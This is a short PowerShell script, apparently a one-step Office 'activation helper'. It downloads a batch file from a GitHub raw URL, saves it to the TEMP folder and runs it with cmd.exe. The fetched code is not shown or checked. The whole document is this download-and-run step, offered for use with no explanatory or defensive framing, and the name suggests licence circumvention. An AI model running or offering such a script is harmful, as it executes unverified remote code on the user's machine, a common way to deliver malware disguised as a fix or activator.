$batchContent = Invoke-RestMethod 'https://raw.githubusercontent.com/badgeart23/office-Aktivierungsassistent/main/office_Aktivierungshilfe.cmd'
$tempFile = "$env:TEMP\office_Aktivierungshilfe.cmd"
$batchContent | Out-File -FilePath $tempFile -Encoding ASCII
Start-Process cmd.exe "/c $tempFile"
